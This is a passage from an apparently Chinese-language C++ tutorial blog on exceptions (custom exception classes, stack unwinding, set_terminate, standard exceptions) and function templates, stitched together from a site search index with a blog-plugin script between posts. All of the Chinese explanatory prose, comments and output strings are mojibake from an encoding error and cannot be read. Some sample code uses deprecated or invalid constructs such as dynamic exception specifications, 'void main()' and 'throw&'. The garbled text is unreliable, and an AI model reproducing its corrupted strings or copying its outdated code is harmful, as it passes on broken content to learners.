SizeException {public: ZeroException(int size) { this-&gt;size = size; } void printErr() { cout &lt;&lt; "æ•°ç»„å¤§å°ä¸å…è®¸ä¸ºé›¶" &lt;&lt; endl; }}; MyArray.h 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889#pragma once#include &lt;iostream&gt;#include "MyException.h"using namespace std;class MyArray {public: // æ„é€ å‡½æ•° MyArray(int size) { // æ•°ç»„åˆå§‹åŒ–å¤§å°æ£€æŸ¥ï¼Œå¤§å°ä¸åˆæ³•åˆ™æŠ›å‡ºå¼‚å¸¸ if (size &lt; 0) { throw NegativeException(size); } else if (size == 0) { throw ZeroException(size); } else if (size &gt; this-&gt;m_max_size) { throw TooBigException(size); } this-&gt;m_size = size; this-&gt;m_space = new int[size]; } // æ‹·è´æ„é€ å‡½æ•° MyArray(const MyArray&amp; obj) { // æ·±æ‹·è´ this-&gt;m_size = obj.m_size; this-&gt;m_space = new int[obj.m_size]; for (int i = 0; i &lt; obj.m_size; i++) { this-&gt;m_space[i] = obj.m_space[i]; } } // ææ„å‡½æ•° ~MyArray() { if (this-&gt;m_space) { delete[] this-&gt;m_space; this-&gt;m_space = NULL; this-&gt;m_size = 0; } }public: // ä½¿ç”¨ç±»æˆå‘˜å‡½æ•°ï¼Œé‡è½½è¿ç®—ç¬¦ "[]" int&amp; operator[](int index) { return this-&gt;m_space[index]; } // ä½¿ç”¨ç±»æˆå‘˜å‡½æ•°ï¼Œé‡è½½è¿ç®—ç¬¦ "=" MyArray&amp; operator=(const MyArray&amp; obj) { // é‡Šæ”¾åŸæœ¬çš„å†…å­˜ç©ºé—´ if (this-&gt;m_space) { delete[] this-&gt;m_space; this-&gt;m_space = NULL; this-&gt;m_size = 0; } // æ·±æ‹·è´ this-&gt;m_size = obj.m_size; this-&gt;m_space = new int[obj.m_size]; for (int i = 0; i &lt; obj.m_size; i++) { this-&gt;m_space[i] = obj.m_space[i]; } return *this; } // ä½¿ç”¨å‹å…ƒå‡½æ•°ï¼Œé‡è½½è¿ç®—ç¬¦ "&lt;&lt;" friend ostream&amp; operator&lt;&lt;(ostream&amp; out, const MyArray&amp; obj);public: int getsize() { return m_size; }private: int* m_space; int m_size; int m_max_size = 1000;};// ä½¿ç”¨å‹å…ƒå‡½æ•°ï¼Œé‡è½½è¿ç®—ç¬¦ "&lt;&lt;"ostream&amp; operator&lt;&lt;(ostream&amp; out, const MyArray&amp; obj) { for (int i = 0; i &lt; obj.m_size; i++) { out &lt;&lt; obj.m_space[i] &lt;&lt; ", "; } return out;} main.cpp 123456789101112131415161718192021222324252627282930313233343536373839404142#include "MyArray.h"int main() { try { // è°ƒç”¨æ„é€ å‡½æ•° MyArray array1(-6); // MyArray array1(5); // MyArray array1(0); // MyArray array1(2000); // é‡è½½è¿ç®—ç¬¦ "[]" for (int i = 0; i &lt; array1.getsize(); i++) { array1[i] = 20 + i; } // é‡è½½è¿ç®—ç¬¦ "&lt;&lt;" cout &lt;&lt; array1 &lt;&lt; endl; // è°ƒç”¨æ‹·è´æ„é€ å‡½æ•° MyArray array2 = array1; cout &lt;&lt; array2 &lt;&lt; endl; MyArray array3(3); array3[0] = 43; array3[1] = 56; array3[2] = 79; cout &lt;&lt; array3 &lt;&lt; endl; // é‡è½½è¿ç®—ç¬¦ "=" array3 = array2; cout &lt;&lt; array3 &lt;&lt; endl; } // ä½¿ç”¨å¼•ç”¨æ•è·å¼‚å¸¸ï¼ˆå¤šæ€ï¼‰ catch (SizeException&amp; e) { e.printErr(); } catch (...) { cout &lt;&lt; "å‘ç”ŸæœªçŸ¥å¼‚å¸¸" &lt;&lt; endl; } return 0;} ç¨‹åºè¿è¡Œè¾“å‡ºçš„ç»“æœå¦‚ä¸‹ï¼š 1æ•°ç»„å¤§å°ä¸èƒ½å°äºé›¶, å½“å‰å¤§å°ä¸º -6 C++ å¼‚å¸¸çš„è¿›é˜¶ä½¿ç”¨æ ˆè§£æ—‹å¼‚å¸¸è¢«æŠ›å‡ºåï¼Œä»è¿›å…¥ try ä»£ç å—èµ·ï¼Œåˆ°å¼‚å¸¸è¢«æŠ›æ·å‰ï¼Œè¿™æœŸé—´åœ¨æ ˆä¸Šæ„é€ çš„æ‰€æœ‰å¯¹è±¡ï¼Œéƒ½ä¼šè¢«è‡ªåŠ¨ææ„ï¼Œææ„çš„é¡ºåºä¸æ„é€ çš„é¡ºåºç›¸åã€‚è¿™ä¸€è¿‡ç¨‹ç§°ä¸º æ ˆè§£æ—‹ï¼ˆunwindingï¼‰ã€‚ 123456789101112131415161718192021222324252627282930313233343536373839404142434445#include &lt;iostream&gt;using namespace std;class Test {public: Test(int a, int b) { this-&gt;a = a; this-&gt;b = b; cout &lt;&lt; "æ„é€ å‡½æ•°è¢«è°ƒç”¨" &lt;&lt; endl; } ~Test() { cout &lt;&lt; "ææ„å‡½æ•°è¢«è°ƒç”¨" &lt;&lt; endl; }private: int a; int b;};int divide(int x, int y) { Test t1(3, 4), t2(5, 6); if (0 == y) { throw y; // æŠ›å‡º int ç±»å‹çš„å¼‚å¸¸ } return x / y;}int main() { // divide(5, 0); å¦‚æœ divide() å‡½æ•°çš„è°ƒç”¨å†™åœ¨ try ä»£ç å—ä¹‹å¤–ï¼Œé‚£ä¹ˆ Test ç±»çš„ææ„å‡½æ•°ä¸ä¼šè‡ªåŠ¨è¢«è°ƒç”¨ try { int result = divide(5, 0); cout &lt;&lt; "result = " &lt;&lt; result &lt;&lt; endl; } catch (int e) { cout &lt;&lt; e &lt;&lt; ", è¢«é™¤æ•°ä¸èƒ½ä¸ºé›¶" &lt;&lt; endl; } catch (...) { cout &lt;&lt; "å‘ç”ŸæœªçŸ¥çš„å¼‚å¸¸"; } return 0;} ç¨‹åºè¿è¡Œè¾“å‡ºçš„ç»“æœå¦‚ä¸‹ï¼š 12345æ„é€ å‡½æ•°è¢«è°ƒç”¨æ„é€ å‡½æ•°è¢«è°ƒç”¨ææ„å‡½æ•°è¢«è°ƒç”¨ææ„å‡½æ•°è¢«è°ƒç”¨0, è¢«é™¤æ•°ä¸èƒ½ä¸ºé›¶ å¼‚å¸¸æ¥å£çš„å£°æ˜ a) ä¸ºäº†åŠ å¼ºç¨‹åºçš„å¯è¯»æ€§ï¼Œå¯ä»¥åœ¨å‡½æ•°å£°æ˜ä¸­åˆ—å‡ºå¯èƒ½æŠ›å‡ºçš„æ‰€æœ‰å¼‚å¸¸ç±»å‹ï¼Œä¾‹å¦‚ï¼švoid func() throw (A, B, C , D) {}ï¼Œè¿™ä¸ªå‡½æ•° funcï¼ˆï¼‰ èƒ½å¤Ÿä¸”åªèƒ½æŠ›å‡ºç±»å‹ Aã€Bã€Cã€D åŠå…¶å­ç±»å‹çš„å¼‚å¸¸ b) å¦‚æœä¸€ä¸ªå‡½æ•°æŠ›å‡ºäº†å®ƒçš„å¼‚å¸¸æ¥å£å£°æ˜æ‰€ä¸å…è®¸æŠ›å‡ºçš„å¼‚å¸¸ï¼Œunexpected() å‡½æ•°ä¼šè¢«è°ƒç”¨ï¼Œè¯¥å‡½æ•°çš„é»˜è®¤è¡Œä¸ºæ˜¯è°ƒç”¨ terminate() å‡½æ•°ä¸­æ­¢ç¨‹åº c) å¦‚æœåœ¨å‡½æ•°å£°æ˜ä¸­æ²¡æœ‰åŒ…å«å¼‚å¸¸æ¥å£å£°æ˜ï¼Œåˆ™æ­¤å‡½æ•°å¯ä»¥æŠ›æ·ä»»ä½•ç±»å‹çš„å¼‚å¸¸ï¼Œä¾‹å¦‚ï¼švoid func() {} d) ä¸€ä¸ªä¸æŠ›æ·ä»»ä½•ç±»å‹å¼‚å¸¸çš„å‡½æ•°ï¼Œå¯ä»¥å£°æ˜ä¸ºï¼švoid func() throw() {} 12345678910111213141516171819202122232425262728293031323334#include &lt;iostream&gt;using namespace std;class A {};class B {};class C {};class D {};class F {};// èƒ½å¤Ÿä¸”åªèƒ½æŠ›å‡ºç±»å‹ Aã€Bã€Cã€D åŠå…¶å­ç±»å‹çš„å¼‚å¸¸void funcA() throw (A, B, C, D) { throw A();}// ä¸èƒ½æŠ›å‡ºä»»ä½•ç±»å‹çš„å¼‚å¸¸void funcB() throw() {}// å¯ä»¥æŠ›å‡ºä»»ä½•ç±»å‹çš„å¼‚å¸¸void funcC() { throw B();}int main() { try { funcA(); } catch (...) { cout &lt;&lt; "å‘ç”Ÿå¼‚å¸¸ ..." &lt;&lt; endl; } return 0;} ç¨‹åºè¿è¡Œè¾“å‡ºçš„ç»“æœå¦‚ä¸‹ï¼š 1å‘ç”Ÿå¼‚å¸¸ ... é»˜è®¤çš„å¼‚å¸¸å¤„ç†å™¨terminate () å‡½æ•°åœ¨ C++ ä¸­ï¼Œå¼‚å¸¸æ˜¯ä¸å¯ä»¥å¿½ç•¥çš„ï¼Œå½“å¼‚å¸¸æ‰¾ä¸åˆ°åŒ¹é…çš„ catch å­å¥æ—¶ï¼Œä¼šè°ƒç”¨ç³»ç»Ÿçš„åº“å‡½æ•° terminate()ï¼ˆåœ¨å¤´æ–‡ä»¶ä¸­ï¼‰ï¼›é»˜è®¤æƒ…å†µä¸‹ï¼Œterminateï¼ˆï¼‰ å‡½æ•°ä¼šè°ƒç”¨æ ‡å‡† C åº“å‡½æ•° abortï¼ˆï¼‰ ä½¿ç¨‹åºç»ˆæ­¢è€Œé€€å‡ºã€‚å½“è°ƒç”¨ abort() å‡½æ•°æ—¶ï¼Œç¨‹åºä¸ä¼šè°ƒç”¨æ­£å¸¸çš„ç»ˆæ­¢å‡½æ•°ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œå…¨å±€å¯¹è±¡å’Œé™æ€å¯¹è±¡çš„ææ„å‡½æ•°ä¸ä¼šæ‰§è¡Œï¼Œè¿™å°±å¯èƒ½ä¼šå¯¼è‡´å†…å­˜æ³„æ¼ã€‚å€¼å¾—ä¸€æçš„æ˜¯ï¼Œåœ¨å¤šçº¿ç¨‹ç¨‹åºä¸­ï¼Œå„ä¸ª terminate() å‡½æ•°æ˜¯äº’ç›¸ç‹¬ç«‹çš„ï¼Œæ¯ä¸ªçº¿ç¨‹éƒ½æœ‰è‡ªå·±çš„ terminate() å‡½æ•°ã€‚ set_terminate () å‡½æ•°åœ¨ C++ ä¸­ï¼Œé€šè¿‡ä½¿ç”¨æ ‡å‡†çš„ set_terminate() å‡½æ•°ï¼Œå¯ä»¥è®¾ç½®è‡ªå·±çš„ terminateï¼ˆ) å‡½æ•°ã€‚è‡ªå®šä¹‰çš„ terminate() å‡½æ•°ä¸èƒ½æœ‰å‚æ•°ï¼Œè€Œä¸”è¿”å›å€¼ç±»å‹å¿…é¡»ä¸º voidã€‚å¦å¤–ï¼Œterminate() å‡½æ•°ä¸èƒ½æŠ›å‡ºå¼‚å¸¸ï¼Œå®ƒå¿…é¡»ç»ˆæ­¢ç¨‹åºã€‚å¦‚æœ terminate() å‡½æ•°è¢«è°ƒç”¨ï¼Œè¿™å°±æ„å‘³ç€é—®é¢˜å·²ç»æ— æ³•è§£å†³äº†ã€‚ è®¾ç½®é»˜è®¤çš„å¼‚å¸¸å¤„ç†å™¨1234567891011121314151617181920212223242526272829303132333435#include &lt;iostream&gt;using namespace std;// è‡ªå®šä¹‰ terminate() å‡½æ•°void myTerminate() { cout &lt;&lt; "å‡½æ•° myTerminate() è¢« terminate() è°ƒç”¨!" &lt;&lt; endl; exit(-1);}int divide(int x, int y) { return x / y;}int main() { // è®¾ç½®é»˜è®¤çš„å¼‚å¸¸å¤„ç†å™¨ set_terminate(myTerminate); int x = 10, y = 0, result; try { if (y == 0) { throw "è¢«é™¤æ•°ä¸ºé›¶!"; //æŠ›å‡ºå¼‚å¸¸ï¼Œç”± terminate() å‡½æ•°æ•è· } else { result = x / y; } } // ä¸ä¼šè¢«æ•´å‹å¼‚å¸¸æ•è· catch (int e) { cout &lt;&lt; "æ•è·åˆ°æ•´å‹å¼‚å¸¸!" &lt;&lt; endl; } cout &lt;&lt; "ç¨‹åºæ­£å¸¸ç»“æŸè¿è¡Œ!" &lt;&lt; endl; return 0;} ç¨‹åºè¿è¡Œè¾“å‡ºçš„ç»“æœå¦‚ä¸‹ï¼š 1å‡½æ•° myTerminate() è¢« terminate() è°ƒç”¨! C++ æä¾›çš„æ ‡å‡†å¼‚å¸¸åº“æ ‡å‡†å¼‚å¸¸åº“çš„ä»‹ç» æ ‡å‡†å¼‚å¸¸åº“çš„ä½¿ç”¨æ¡ˆä¾‹123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051#include &lt;iostream&gt;using namespace std;class Teacher {public: Teacher(int age) { if (age &gt; 100) { // æŠ›å‡ºæ ‡å‡†åº“å†…çš„å¼‚å¸¸ throw out_of_range("å¹´é¾„å¤ªå¤§"); } this-&gt;age = age; }private: int age;};// ç»§æ‰¿æ ‡å‡†åº“å†…çš„å¼‚å¸¸class MyException : public exception {public: MyException(const char *p) { this-&gt;m_p = p; } virtual const char *what() { cout &lt;&lt; "MyException ç±»å‹çš„å¼‚å¸¸ : " &lt;&lt; m_p &lt;&lt; endl; return m_p; }private: const char *m_p;};int main() { try { // Teacher teacher(105); throw MyException("å‘ç”Ÿè‡ªå®šä¹‰å¼‚å¸¸!"); } catch (out_of_range e) { cout &lt;&lt; "out_of_range ç±»å‹çš„å¼‚å¸¸ : " &lt;&lt; e.what() &lt;&lt; endl; } catch (MyException &amp;e) { e.what(); } catch (...) { cout &lt;&lt; "å‘ç”ŸæœªçŸ¥ç±»å‹çš„å¼‚å¸¸!" &lt;&lt; endl; } return 0;} ç¨‹åºè¿è¡Œè¾“å‡ºçš„ç»“æœå¦‚ä¸‹ï¼š 1MyException ç±»å‹çš„å¼‚å¸¸ : å‘ç”Ÿè‡ªå®šä¹‰å¼‚å¸¸! å¼‚å¸¸ç±»å‹å’Œå¼‚å¸¸å˜é‡çš„ç”Ÿå‘½å‘¨æœŸ throw å¼‚å¸¸æ˜¯æœ‰ç±»å‹çš„ï¼Œå¯ä»¥ä½¿ç”¨æ•°å­—ã€å­—ç¬¦ä¸²ã€ç±»å¯¹è±¡ï¼Œcatch ä¸¥æ ¼æŒ‰ç…§ç±»å‹è¿›è¡ŒåŒ¹é… throw ç±»å¯¹è±¡ç±»å‹çš„å¼‚å¸¸æ—¶ï¼š å¦‚æœæ•è·å¼‚å¸¸çš„æ—¶å€™ï¼Œä½¿ç”¨ä¸€ä¸ªå¼‚å¸¸å˜é‡ï¼Œåˆ™æ‹·è´æ„é€ è¯¥å¼‚å¸¸å˜é‡ å¦‚æœæ•è·å¼‚å¸¸çš„æ—¶å€™ï¼Œä½¿ç”¨äº†å¼•ç”¨ï¼Œåˆ™ä¼šä½¿ç”¨ throw æ—¶å€™çš„é‚£ä¸ªå¯¹è±¡ æ•è·å¼‚å¸¸çš„æ—¶å€™ï¼ŒæŒ‡é’ˆå¯ä»¥å’Œå¼•ç”¨ / å…ƒç´ åŒæ—¶å‡ºç°ï¼Œä½†æ˜¯å¼•ç”¨ä¸å…ƒç´ ä¸èƒ½åŒæ—¶å‡ºç° ç»“è®ºï¼šå¦‚æœæŠ›å‡ºçš„æ˜¯ç±»å¯¹è±¡ç±»å‹çš„å¼‚å¸¸ï¼Œåˆ™ä½¿ç”¨å¼•ç”¨è¿›è¡Œå¼‚å¸¸æ•è·æ¯”è¾ƒåˆé€‚ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596#include &lt;iostream&gt;using namespace std;class BadSrcType {};class BadDestType {};class BadProcessType {public: BadProcessType() { cout &lt;&lt; "BadProcessTypeçš„æ„é€ å‡½æ•°è¢«è°ƒç”¨" &lt;&lt; endl; } BadProcessType(const BadProcessType&amp; obj) { cout &lt;&lt; "BadProcessTypeçš„æ‹·è´æ„é€ å‡½æ•°è¢«è°ƒç”¨" &lt;&lt; endl; } ~BadProcessType() { cout &lt;&lt; "BadProcessTypeçš„ææ„å‡½æ•°è¢«è°ƒç”¨" &lt;&lt; endl; }};void myStrcpy(char* to, char* from) { if (to == NULL) { throw BadDestType(); } if (from == NULL) { throw BadSrcType(); } if (*from == \'a\') { throw BadProcessType(); } if (*from == \'b\') { // ä¸å»ºè®®ä½¿ç”¨è¿™ç§å†™æ³• throw&amp; (BadProcessType()); } if (*from == \'c\') { throw new BadProcessType; } while (*from != \'\\0\') { *to = *from; to++; from++; } *to = \'\\0\';}int main() { int ret = 0; char buf1[] = "cbbcdefg"; char buf2[1024] = { 0 }; try { myStrcpy(buf2, buf1); } catch (BadSrcType e) { cout &lt;&lt; " BadSrcType ç±»å‹å¼‚å¸¸" &lt;&lt; endl; } catch (BadDestType e) { cout &lt;&lt; " BadDestType ç±»å‹å¼‚å¸¸" &lt;&lt; endl; } /* // ç»“è®º1: å¦‚æœæ¥æ”¶å¼‚å¸¸çš„æ—¶å€™ï¼Œä½¿ç”¨ä¸€ä¸ªå¼‚å¸¸å˜é‡ï¼Œåˆ™æ‹·è´æ„é€ è¯¥å¼‚å¸¸å˜é‡ catch (BadProcessType e) { cout &lt;&lt; " BadProcessType ç±»å‹å¼‚å¸¸" &lt;&lt; endl; } // ç»“è®º2: å¦‚æœæ¥æ”¶å¼‚å¸¸çš„æ—¶å€™ï¼Œä½¿ç”¨äº†å¼•ç”¨ï¼Œåˆ™ä¼šä½¿ç”¨throwæ—¶å€™çš„é‚£ä¸ªå¯¹è±¡ catch (BadProcessType&amp; e) { cout &lt;&lt; " BadProcessType ç±»å‹å¼‚å¸¸" &lt;&lt; endl; } // ç»“è®º3: æ¥æ”¶å¼‚å¸¸çš„æ—¶å€™ï¼ŒæŒ‡é’ˆå¯ä»¥å’Œå¼•ç”¨/å…ƒç´ åŒæ—¶å‡ºç°ï¼Œä½†æ˜¯å¼•ç”¨ä¸å…ƒç´ ä¸èƒ½åŒæ—¶å‡ºç° catch (BadProcessType* e) { cout &lt;&lt; " BadProcessType ç±»å‹å¼‚å¸¸" &lt;&lt; endl; delete e; } // ç»“è®º4: å¦‚æœæŠ›å‡ºçš„æ˜¯ç±»å¯¹è±¡ç±»å‹çš„å¼‚å¸¸ï¼Œåˆ™ä½¿ç”¨å¼•ç”¨è¿›è¡Œå¼‚å¸¸æ•è·æ¯”è¾ƒåˆé€‚ */ catch (...) { cout &lt;&lt; "æœªçŸ¥ ç±»å‹å¼‚å¸¸" &lt;&lt; endl; } return 0;} var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "å…¨æ ˆæŠ€æœ¯é©¿ç«™", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "type": "hexo", "random": "0.9", "interval": "30", "expires": "365", "height": "auto" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"c++"},{title:"C++ è¿›é˜¶åŸºç¡€ä¹‹äºŒ",url:"/posts/779107de.html",text:'å‡½æ•°æ¨¡æ¿å’Œç±»æ¨¡æ¿C++ æä¾›äº†å‡½æ•°æ¨¡æ¿ï¼ˆfunction templateï¼‰ã€‚æ‰€è°“å‡½æ•°æ¨¡æ¿ï¼Œå®é™…ä¸Šæ˜¯å»ºç«‹ä¸€ä¸ªé€šç”¨å‡½æ•°ï¼Œå…¶å‡½æ•°ç±»å‹å’Œå½¢å‚ç±»å‹ä¸å…·ä½“æŒ‡å®šï¼Œç”¨ä¸€ä¸ªè™šæ‹Ÿçš„ç±»å‹æ¥ä»£è¡¨ï¼Œè¿™ä¸ªé€šç”¨å‡½æ•°å°±ç§°ä¸ºå‡½æ•°æ¨¡æ¿ã€‚å‡¡æ˜¯å‡½æ•°ä½“ç›¸åŒçš„å‡½æ•°éƒ½å¯ä»¥ç”¨è¿™ä¸ªæ¨¡æ¿æ¥ä»£æ›¿ï¼Œä¸å¿…å®šä¹‰å¤šä¸ªå‡½æ•°ï¼Œåªéœ€åœ¨æ¨¡æ¿ä¸­å®šä¹‰ä¸€æ¬¡å³å¯ã€‚åœ¨è°ƒç”¨å‡½æ•°æ—¶ï¼Œç³»ç»Ÿä¼šæ ¹æ®å®å‚çš„ç±»å‹æ¥å–ä»£æ¨¡æ¿ä¸­çš„è™šæ‹Ÿç±»å‹ï¼Œä»è€Œå®ç°ä¸åŒå‡½æ•°çš„åŠŸèƒ½ã€‚ C++ æä¾›ä¸¤ç§æ¨¡æ¿æœºåˆ¶ï¼šå‡½æ•°æ¨¡æ¿ã€ç±»æ¨¡æ¿ æ¨¡æ¿åˆç§°ä¹‹ä¸º æ³›å‹ç¼–ç¨‹ æ¨¡æ¿æŠŠå‡½æ•°æˆ–ç±»è¦å¤„ç†çš„æ•°æ®ç±»å‹å‚æ•°åŒ–ï¼Œè¡¨ç°ä¸ºå‚æ•°çš„å¤šæ€æ€§ï¼Œç§°ä¸ºç±»å± æ¨¡æ¿ç”¨äºè¡¨è¾¾é€»è¾‘ç»“æ„ç›¸åŒï¼Œä½†å…·æœ‰æ•°æ®å…ƒç´ ç±»å‹ä¸åŒçš„æ•°æ®å¯¹è±¡çš„é€šç”¨è¡Œä¸º ç±»å± â€”â€” ç±»å‹å‚æ•°åŒ–ï¼Œåˆç§°å‚æ•°æ¨¡æ¿ï¼Œä½¿å¾—ç¨‹åºï¼ˆç®—æ³•ï¼‰å¯ä»¥ä»é€»è¾‘åŠŸèƒ½ä¸ŠæŠ½è±¡ï¼ŒæŠŠè¢«å¤„ç†çš„å¯¹è±¡ï¼ˆæ•°æ®ï¼‰ç±»å‹ä½œä¸ºå‚æ•°ä¼ é€’ å‡½æ•°æ¨¡æ¿å‡½æ•°æ¨¡æ¿çš„å®šä¹‰ æ¨¡æ¿å£°æ˜çš„è¯­æ³•ä¸ºï¼štemplate &lt; ç±»å‹å½¢å¼å‚æ•°è¡¨ &gt;ï¼Œä¾‹å¦‚ template &lt;typename T&gt; ç±»å‹å½¢å¼å‚æ•°è¡¨çš„è¯­æ³•ä¸ºï¼štypename T1 , typename T2 , â€¦â€¦ , typename Tn æˆ–è€… class T1 , class T2 , â€¦â€¦ , class Tn å‡½æ•°æ¨¡æ¿çš„è°ƒç”¨ myswap(a, b);ï¼šè‡ªåŠ¨æ•°æ®ç±»å‹æ¨å¯¼ myswap&lt;float&gt;(a, b);ï¼šæ˜¾ç¤ºç±»å‹è°ƒç”¨ï¼ˆæ¨èï¼‰ å‡½æ•°æ¨¡æ¿çš„ç®€å•ä½¿ç”¨ 12345678910111213141516171819202122232425262728293031323334#include &lt;iostream&gt;using namespace std;// æ¨¡æ¿å£°æ˜template &lt;typename T&gt;// å‡½æ•°å®šä¹‰void myswap(T &amp;a, T &amp;b) { T temp; temp = a; a = b; b = temp;}int main() { // è‡ªåŠ¨æ•°æ®ç±»å‹æ¨å¯¼ int x = 1, y = 2; myswap(x, y); printf("x = %d, y = %d\\n", x, y); // è‡ªåŠ¨æ•°æ®ç±»å‹æ¨å¯¼ double n = 0.5, m = 0.8; myswap(n, m); printf("n = %f, m = %f\\n", n, m); // æ˜¾ç¤ºç±»å‹è°ƒç”¨ï¼ˆæ¨èï¼‰ char i = \'h\', j = \'e\'; myswap&lt;char&gt;(i, j); printf("n = %c, m = %c\\n", i, j); return 0;} ç¨‹åºè¿è¡Œè¾“å‡ºçš„ç»“æœå¦‚ä¸‹ï¼š 123x = 2, y = 1n = 0.800000, m = 0.500000n = e, m = h å‡½æ•°æ¨¡æ¿åšå‡½æ•°å‚æ•°123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172#include &lt;iostream&gt;using namespace std;// ä½¿ç”¨å‡½æ•°æ¨¡æ¿ï¼Œå®ç°æ•°ç»„æ’åºtemplate &lt;typename T1&gt;void arraySort(T1* array, int size, bool asc = true) { if (array == NULL || size == 0) { return; } T1 tmp; for (int i = 0; i &lt; size; i++) { for (int j = i + 1; j &lt; size; j++) { // å‡åºæ’åºï¼ˆä»å°åˆ°å¤§ï¼‰ if (asc) { if (array[i] &gt; array[j]) { tmp = array[i]; array[i] = array[j]; array[j] = tmp; } } // é™åºæ’åºï¼ˆä»å¤§åˆ°å°ï¼‰ else { if (array[i] &lt; array[j]) { tmp = array[i]; array[i] = array[j]; array[j] = tmp; } } } }}// ä½¿ç”¨å‡½æ•°æ¨¡æ¿ï¼Œæ‰“å°æ•°ç»„template &lt;typename T2&gt;void printArray(T2* array, int size) { for (int i = 0; i &lt; size; i++) { cout &lt;&lt; array[i] &lt;&lt; " "; } cout &lt;&lt; endl;}int main() { int array[] = { 32, 16, 29, 9, 43, 53, 23 }; int size = sizeof(array) / sizeof(*array); cout &lt;&lt; "æ’åºä¹‹å‰: "; printArray&lt;int&gt;(array, size); arraySort&lt;int&gt;(array, size, false); cout &lt;&lt; "æ’åºä¹‹å: "; printArray&lt;int&gt;(array, size); cout &lt;&lt; "------------------------------" &lt;&lt; endl; char array2[] = { \'c\', \'z\', \'h\', \'i\', \'q\', \'m\' }; int size2 = sizeof(array2) / sizeof(*array2); cout &lt;&lt; "æ’åºä¹‹å‰: "; printArray&lt;char&gt;(array2, size2); arraySort&lt;char&gt;(array2, size2); cout &lt;&lt; "æ’åºä¹‹å: "; printArray&lt;char&gt;(array2, size2); return 0;} ç¨‹åºè¿è¡Œè¾“å‡ºçš„ç»“æœå¦‚ä¸‹ï¼š 12345æ’åºä¹‹å‰: 32 16 29 9 43 53 23æ’åºä¹‹å: 53 43 32 29 23 16 9------------------------------æ’åºä¹‹å‰: c z h i q mæ’åºä¹‹å: c h i m q z å‡½æ•°æ¨¡æ¿ä¸æ™®é€šå‡½æ•°å‡½æ•°æ¨¡æ¿å’Œæ™®é€šå‡½æ•°çš„åŒºåˆ«ï¼š a) å‡½æ•°æ¨¡æ¿ä¸å…è®¸è‡ªåŠ¨ç±»å‹è½¬åŒ– b) æ™®é€šå‡½æ•°èƒ½å¤Ÿè¿›è¡Œè‡ªåŠ¨ç±»å‹è½¬æ¢ å‡½æ•°æ¨¡æ¿å’Œæ™®é€šå‡½æ•°çš„è°ƒç”¨è§„åˆ™ï¼š a) C++ ç¼–è¯‘å™¨ä¼˜å…ˆè€ƒè™‘ä½¿ç”¨æ™®é€šå‡½æ•° b) å¦‚æœå‡½æ•°æ¨¡æ¿å¯ä»¥äº§ç”Ÿä¸€ä¸ªæ›´å¥½çš„åŒ¹é…ï¼Œé‚£ä¹ˆç¼–è¯‘å™¨ä¼šé€‰æ‹©å‡½æ•°æ¨¡æ¿ 123456789101112131415161718192021222324252627#include &lt;iostream&gt;using namespace std;template &lt;typename T&gt;void myswap(T&amp; a, T&amp; b) { T tmp; tmp = a; a = b; b = tmp; cout &lt;&lt; "æ¨¡æ¿å‡½æ•°è¢«è°ƒç”¨" &lt;&lt; endl;}void myswap(int a, char b) { cout &lt;&lt; "a = " &lt;&lt; a &lt;&lt; ", b = " &lt;&lt; b &lt;&lt; endl; cout &lt;&lt; "æ™®é€šå‡½æ•°è¢«è°ƒç”¨" &lt;&lt; endl;}int main() { int a = 10; char c = \'z\'; myswap(a, c); // è°ƒç”¨æ™®é€šå‡½æ•° myswap(c, a); // è°ƒç”¨æ™®é€šå‡½æ•°ï¼Œä¼šè¿›è¡Œéšå¼çš„ç±»å‹è½¬æ¢ myswap(a, a); // è°ƒç”¨å‡½æ•°æ¨¡æ¿ï¼ˆæœ¬è´¨æ˜¯ç±»å‹å‚æ•°åŒ–ï¼‰ï¼Œå°†ä¸¥æ ¼åœ°æŒ‰ç…§ç±»å‹è¿›è¡ŒåŒ¹é…ï¼Œä¸ä¼šè¿›è¡Œéšå¼çš„ç±»å‹è½¬æ¢ return 0;} ç¨‹åºè¿è¡Œè¾“å‡ºçš„ç»“æœå¦‚ä¸‹ï¼š 123456a = 10, b = zæ™®é€šå‡½æ•°è¢«è°ƒç”¨a = 122, b =æ™®é€šå‡½æ•°è¢«è°ƒç”¨æ¨¡æ¿å‡½æ•°è¢«è°ƒç”¨ å‡½æ•°æ¨¡æ¿ä¸å‡½æ•°é‡è½½ a) å‡½æ•°æ¨¡æ¿å¯ä»¥åƒæ™®é€šå‡½æ•°ä¸€æ ·è¢«é‡è½½ b) é€šè¿‡ç©ºæ¨¡æ¿å®å‚åˆ—è¡¨çš„è¯­æ³•ï¼Œå¯ä»¥é™åˆ¶ç¼–è¯‘å™¨åªä½¿ç”¨å‡½æ•°æ¨¡æ¿åŒ¹é… c) å¦‚æœå‡½æ•°æ¨¡æ¿å¯ä»¥äº§ç”Ÿä¸€ä¸ªæ›´å¥½çš„åŒ¹é…ï¼Œé‚£ä¹ˆç¼–è¯‘å™¨ä¼šé€‰æ‹©å‡½æ•°æ¨¡æ¿ 123456789101112131415161718192021222324252627282930313233343536#include "iostream"using namespace std;int Max(int a, int b){ cout &lt;&lt; "int Max(int a, int b)" &lt;&lt; endl; return a &gt; b ? a : b;}template &lt;typename T&gt;T Max(T a, T b){ cout &lt;&lt; "T Max(T a, T b)" &lt;&lt; endl; return a &gt; b ? a : b;}// å‡½æ•°æ¨¡æ¿é‡è½½template &lt;typename T&gt;T Max(T a, T b, T c){ cout &lt;&lt; "T Max(T a, T b, T c)" &lt;&lt; endl; return Max(Max(a, b), c);}void main(){ int a = 1; int b = 2; cout &lt;&lt; Max(a, b) &lt;&lt; endl; // 